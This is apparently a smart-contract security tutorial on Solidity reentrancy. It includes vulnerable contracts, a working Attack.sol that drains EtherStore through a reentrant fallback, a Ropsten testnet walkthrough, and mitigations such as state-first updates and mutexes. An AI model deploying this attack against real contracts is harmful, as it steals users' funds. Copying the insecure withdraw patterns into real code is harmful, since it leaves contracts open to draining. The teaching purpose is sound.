# Reentrancy

## Reentrancy

Re-entrancy happens in single-thread computing environments, when the execution stack jumps or calls subroutines, before returning to the original execution.

This type of attack can occur when a contract sends ether to an unknown address. An attacker can carefully construct a contract at an external address that contains malicious code in the fallback function. Thus, when a contract sends ether to this address, it will invoke the malicious code. Typically the malicious code executes a function on the vulnerable contract,

• Fallback functions [can be called by anyone & execute malicious code](https://hackernoon.com/ethernaut-lvl-1-walkthrough-how-to-abuse-the-fallback-function-118057b68b56)  
• Malicious external contracts [can abuse withdrawals](https://medium.com/coinmonks/ethernaut-lvl-9-king-walkthrough-how-bad-contracts-can-abuse-withdrawals-db12754f359b)

### Example:

1. A smart contract tracks the balance of a number of external addresses and allows users to retrieve funds with its public `withdraw()` function.  
2. A malicious smart contract uses the `withdraw()` function to retrieve its entire balance.  
3. The victim contract executes the `call.value(amount)()` low level function to send the ether to the malicious contract before updating the balance of the malicious contract.  
4. The malicious contract has a payable `fallback()` function that accepts the funds and then calls back into the victim contract's `withdraw()` function.  
5. This second execution triggers a transfer of funds: remember, the balance of the malicious contract still hasn't been updated from the first withdrawal. As a result, the malicious contract successfully withdraws its entire balance a second time.

### Code Example:

The following function contains a function vulnerable to a reentrancy attack. When the low level `call()` function sends ether to the `msg.sender` address, it becomes vulnerable; if the address is a smart contract, the payment will trigger its fallback function with what's left of the transaction gas:

function withdraw\(uint \_amount\) {  
 require\(balances\[msg.sender\] &gt;= \_amount\);  
 msg.sender.call.value\(\_amount\)\(\);  
 balances\[msg.sender\] -= \_amount;  
}

## Example - EtherStore.sol

#### EtherStore.Sol

pragma solidity 0.4.18;

contract EtherStore {

    uint256 public withdrawalLimit = 0.1 ether;  
    mapping\(address =&gt; uint256\) public lastWithdrawTime;  
    mapping\(address =&gt; uint256\) public balances;

    function depositFunds\(\) public payable {  
        balances\[msg.sender\] += msg.value;  
    }

    function withdrawFunds \(uint256 \_weiToWithdraw\) public {  
        require\(balances\[msg.sender\] &gt;= \_weiToWithdraw\);  
        // limit the withdrawal  
        require\(\_weiToWithdraw &lt;= withdrawalLimit\);  
        // limit the time allowed to withdraw  
        require\(now &gt;= lastWithdrawTime\[msg.sender\] + 1 weeks\);  
        require\(msg.sender.call.value\(\_weiToWithdraw\)\(\)\);  
        balances\[msg.sender\] -= \_weiToWithdraw;  
        lastWithdrawTime\[msg.sender\] = now;  
    }  
 }

Note: `withdrawLimit` set to 0.1 ether.

Deployed on Ropsten:  
[https://ropsten.etherscan.io/tx/0x34996d7830b216d93e5ecda9468fe472e485dbdb609884405e7f1b5c74533d39](https://ropsten.etherscan.io/tx/0x34996d7830b216d93e5ecda9468fe472e485dbdb609884405e7f1b5c74533d39)

From \(Metamask\):  
`0x109bb3673f445d8b0d2b04436d7b4a630b873b81`  
To \(contract\):  
`0x52b2a43b59a39f4c863aa86da6c6fe73b33bdc73`

#### Attack.sol

pragma solidity 0.4.18;

contract EtherStore {

        function depositFunds\(\) public payable {}

        function withdrawFunds\(uint256\) public {}

    }

contract Attack {  
    //EtherStore public etherStore;  
    EtherStore public etherStore;

        function Attack\(address \_t\) public {  
        etherStore = EtherStore\(\_t\);  
    }

  function attackEtherStore\(\) public payable {  
      // attack to the nearest ether  
      require\(msg.value &gt;= 0.1 ether\);  
      // send eth to the depositFunds\(\) function  
      etherStore.depositFunds.value\(0.1 ether\)\(\);  
      // start the magic  
      etherStore.withdrawFunds\(0.1 ether\);  
  }

  function collectEther\(\) public {  
      msg.sender.transfer\(this.balance\);  
  }

  // fallback function - where the magic happens  
  function \(\) payable {  
      if \(etherStore.balance &gt; 0.1 ether\) {  
          etherStore.withdrawFunds\(0.1 ether\);  
      }  
  }  
}

[https://ropsten.etherscan.io/tx/0x551f6d272274edbef299763343a4daea58438ef20522ed526ecfea7bff59734f](https://ropsten.etherscan.io/tx/0x551f6d272274edbef299763343a4daea58438ef20522ed526ecfea7bff59734f)  
From:  
`0x109bb3673f445d8b0d2b04436d7b4a630b873b81`  
To:  
`0x733146fa7f8b40f4c97d946efeb7bdc9ff69ba6e`

Deposit some Eth from Metamask \(pretend this is some other user/victim\) to EtherStore \(to steal later\):  
[https://ropsten.etherscan.io/tx/0x58671521d2c0df635bf0c3986d53186e38ebe8d4f7d62c2fb5f681e0d938bec6](https://ropsten.etherscan.io/tx/0x58671521d2c0df635bf0c3986d53186e38ebe8d4f7d62c2fb5f681e0d938bec6)  
[![images/23-1.png](../.gitbook/assets/23-1%20%281%29.png)](smart_contracts_security.ctb-9.md)

I can now check the balance of my Metamask account by calling the `balances` mapping:

[![images/23-2.png](../.gitbook/assets/23-2%20%281%29.png)](smart_contracts_security.ctb-9.md)

Send 0.1 eth from the Attack.sol contract so that it has some balance to call `withdrawFunds()` later.

The following transaction sends 0.1 eth to Attack.sol's payable attackEtherStore\(\) function which will in turn deposit and subsequently withdraw funds from EtherStore.sol

From:  
`0x109Bb3673f445D8b0d2b04436D7b4a630B873B81`  
To:  
`0x733146Fa7F8B40f4c97d946EfEb7bdc9ff69BA6E`  
Tx:  
[https://ropsten.etherscan.io/tx/0xb6e7cc1fbd093691d75f0a877a5efb998591f88aac938c3e836b6de918a8594a](https://ropsten.etherscan.io/tx/0xb6e7cc1fbd093691d75f0a877a5efb998591f88aac938c3e836b6de918a8594a)

[![images/23-3.png](../.gitbook/assets/23-3%20%281%29.png)](smart_contracts_security.ctb-9.md)

Once executed, we can see the current balance is 0.1 eth, even though 0.5 was sent

[![images/23-4.png](../.gitbook/assets/23-4%20%281%29.png)](smart_contracts_security.ctb-9.md)

Because 5 ether were actually sent

Notice that the first Tx in the followig image shows 0.1 ether being sent from the Attack.sol address to EtherStore.sol, followed by 5 outgoing transacions from the EtherStore.sol to Attack.Sol contract. Now Attack.sol has 0.5 eth!!!

[![images/23-5.png](../.gitbook/assets/23-5%20%281%29.png)](smart_contracts_security.ctb-9.md)

Also the Attack.sol contract has a massive balance on EtherStore, not sure why:

[![images/23-6.png](../.gitbook/assets/23-6%20%281%29.png)](smart_contracts_security.ctb-9.md)

Calling CollectEther\(\) Sends those 0.5 eth back to our wallet address!

[https://ropsten.etherscan.io/tx/0xf11dcf8de8bed562a8b4f0d977efbe2db8940adee4745c0400e8f44b95ffed93](https://ropsten.etherscan.io/tx/0xf11dcf8de8bed562a8b4f0d977efbe2db8940adee4745c0400e8f44b95ffed93)  
[![images/23-7.png](../.gitbook/assets/23-7%20%281%29.png)](smart_contracts_security.ctb-9.md)

This becomes clearer is we export the internal transactions to csv:

[![images/23-8.png](../.gitbook/assets/23-8%20%281%29.png)](smart_contracts_security.ctb-9.md)

## Ethernaut

pragma solidity ^0.4.18;

contract Reentrance {

  mapping\(address =&gt; uint\) public balances;

  function donate\(address \_to\) public payable {  
    balances\[\_to\] += msg.value;  
  }

  function balanceOf\(address \_who\) public view returns \(uint balance\) {  
    return balances\[\_who\];  
  }

  function withdraw\(uint \_amount\) public {  
    if\(balances\[msg.sender\] &gt;= \_amount\) {  
      if\(msg.sender.call.value\(\_amount\)\(\)\) {  
        \_amount;  
      }  
      balances\[msg.sender\] -= \_amount;  
    }  
  }

  function\(\) public payable {}  
}

This Ethernaut level exploits this reentrancy issue and the following, additional factors that led to the [DAO hack](http://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/):  
• Fallback functions [can be called by anyone & execute malicious code](https://hackernoon.com/ethernaut-lvl-1-walkthrough-how-to-abuse-the-fallback-function-118057b68b56)  
• Malicious external contracts [can abuse withdrawals](https://medium.com/coinmonks/ethernaut-lvl-9-king-walkthrough-how-bad-contracts-can-abuse-withdrawals-db12754f359b)

## Preventative Techniques

### Reentrancy on a Single Function

// INSECURE  
mapping \(address =&gt; uint\) private userBalances;

function withdrawBalance\(\) public {  
    uint amountToWithdraw = userBalances\[msg.sender\];  
    require\(msg.sender.call.value\(amountToWithdraw\)\(\)\); // At this point, the caller's code is executed, and can call withdrawBalance again  
    userBalances\[msg.sender\] = 0;  
}

#### Preventative Techniques

In the example given, the best mitigation method is to [use](https://consensys.github.io/smart-contract-best-practices/recommendations#send-vs-call-value) [send\(\)](https://consensys.github.io/smart-contract-best-practices/recommendations#send-vs-call-value) [instead of](https://consensys.github.io/smart-contract-best-practices/recommendations#send-vs-call-value) [call.value\(\)\(\)](https://consensys.github.io/smart-contract-best-practices/recommendations#send-vs-call-value). This will limit any external code from being executed.

However, if you can't remove the external call, the next simplest way to prevent this attack is to make sure you don't call an external function until you've done all the internal work you need to do:

**`userBalances[msg.sender] = 0;`**  
`require(msg.sender.call.value(amountToWithdraw)()); // The user's balance is already 0, so future invocations won't withdraw anything  
}`

Note that if you had another function which called withdrawBalance\(\), it would be potentially subject to the same attack, so you must treat any function which calls an untrusted contract as itself untrusted. See below for further discussion of potential solutions.

### Cross-function Reentrancy

An attacker may also be able to do a similar attack using two different functions that share the same state.

// INSECURE  
mapping \(address =&gt; uint\) private userBalances;

function transfer\(address to, uint amount\) {  
    if \(userBalances\[msg.sender\] &gt;= amount\) {  
       userBalances\[to\] += amount;  
       userBalances\[msg.sender\] -= amount;  
    }  
}

function withdrawBalance\(\) public {  
    uint amountToWithdraw = userBalances\[msg.sender\];  
    require\(msg.sender.call.value\(amountToWithdraw\)\(\)\); // At this point, the caller's code is executed, and can call transfer\(\)  
    userBalances\[msg.sender\] = 0;  
}

In this case, the attacker calls `transfer()` when their code is executed on the external call in withdrawBalance. Since their balance has not yet been set to 0, they are able to transfer the tokens even though they already received the withdrawal. This vulnerability was also used in the DAO attack.

The same solutions will work, with the same caveats. Also note that in this example, both functions were part of the same contract. However, the same bug can occur across multiple contracts, if those contracts share state.

## Pitfalls in Reentrancy Solutions

## Pitfalls in Reentrancy Solutions

Since reentrancy can occur across multiple functions, and even multiple contracts, any solution aimed at preventing reentrancy with a single function will not be sufficient.

Instead, **we have recommended finishing all internal work \(ie. state changes\) first, and only then calling the external function**. This rule, if followed carefully, will allow you to avoid vulnerabilities due to reentrancy. However, you need to not only avoid calling external functions too soon, but also avoid calling functions which call external functions. For example, the following is insecure:

// INSECURE  
mapping \(address =&gt; uint\) private userBalances;  
mapping \(address =&gt; bool\) private claimedBonus;  
mapping \(address =&gt; uint\) private rewardsForA;

//UNTRUSTED  
function withdrawReward\(address recipient\) public {  
    uint amountToWithdraw = rewardsForA\[recipient\];  
    rewardsForA\[recipient\] = 0;  
    require\(recipient.call.value\(amountToWithdraw\)\(\)\); // REENTRANCY  
}

//UNTRUSTED  
function getFirstWithdrawalBonus\(address recipient\) public {  
    require\(!claimedBonus\[recipient\]\); // Each recipient should only be able to claim the bonus once

    rewardsForA\[recipient\] += 100; //  
    withdrawReward\(recipient\); // ! At this point, the caller will be able to execute getFirstWithdrawalBonus again.  
    claimedBonus\[recipient\] = true; // state change  
}

Even though `getFirstWithdrawalBonus()` doesn't directly call an external contract, the call in `withdrawReward()` is enough to make it vulnerable to a reentrancy. You therefore need to treat `withdrawReward()` as if it were also untrusted.

mapping \(address =&gt; uint\) private userBalances;  
mapping \(address =&gt; bool\) private claimedBonus;  
mapping \(address =&gt; uint\) private rewardsForA;

function untrustedWithdrawReward\(address recipient\) public {  
    uint amountToWithdraw = rewardsForA\[recipient\];  
    rewardsForA\[recipient\] = 0;  
    require\(recipient.call.value\(amountToWithdraw\)\(\)\);  
}

function untrustedGetFirstWithdrawalBonus\(address recipient\) public {  
    require\(!claimedBonus\[recipient\]\); // Each recipient should only be able to claim the bonus once

    claimedBonus\[recipient\] = true; // state change first  
    rewardsForA\[recipient\] += 100;  
    untrustedWithdrawReward\(recipient\); // claimedBonus has been set to true, so reentry is impossible  
}

In addition to the fix making reentry impossible, [untrusted functions have been marked](Vulnerabilities--Reentrancy_HTML/Best_Practices--Solidity_Recommendations--Protocol_specific_recommendations.html#mark_untrusted). this same pattern repeats at every level: since `untrustedGetFirstWithdrawalBonus()` calls `untrustedWithdrawReward()`, which calls an external contract, you must also treat `untrustedGetFirstWithdrawalBonus()` as insecure.

Another solution often suggested is a [mutex](https://en.wikipedia.org/wiki/Mutual_exclusion). This allows you to "lock" some state so it can only be changed by the owner of the lock. A simple example might look like this:

// Note: This is a rudimentary example, and mutexes are particularly useful where there is substantial logic and/or shared state  
mapping \(address =&gt; uint\) private balances;  
bool private lockBalances;

function deposit\(\) payable public returns \(bool\) {  
    require\(!lockBalances\);  
    lockBalances = true;  
    balances\[msg.sender\] += msg.value;  
    lockBalances = false;  
    return true;  
}

function withdraw\(uint amount\) payable public returns \(bool\) {  
    require\(!lockBalances && amount &gt; 0 && balances\[msg.sender\] &gt;= amount\);  
    lockBalances = true;

    if \(msg.sender.call\(amount\)\(\)\) { // Normally insecure, but the mutex saves it  
      balances\[msg.sender\] -= amount;  
    }

    lockBalances = false;  
    return true;  
}

If the user tries to call `withdraw()` again before the first call finishes, the lock will prevent it from having any effect. This can be an effective pattern, but it gets tricky when you have multiple contracts that need to cooperate. The following is insecure:

// INSECURE  
contract StateHolder {  
    uint private n;  
    address private lockHolder;

    function getLock\(\) {  
        require\(lockHolder == address\(0\)\);  
        lockHolder = msg.sender;  
    }

    function releaseLock\(\) {  
        require\(msg.sender == lockHolder\);  
        lockHolder = address\(0\);  
    }

    function set\(uint newState\) {  
        require\(msg.sender == lockHolder\);  
        n = newState;  
    }  
}

An attacker can call `getLock()`, and then never call `releaseLock()`. If they do this, then the contract will be locked forever, and no further changes will be able to be made. If you use mutexes to protect against reentrancy, you will need to carefully ensure that there are no ways for a lock to be claimed and never released. \(There are other potential dangers when programming with mutexes, such as deadlocks and livelocks. You should consult the large amount of literature already written on mutexes, if you decide to go this route.\)

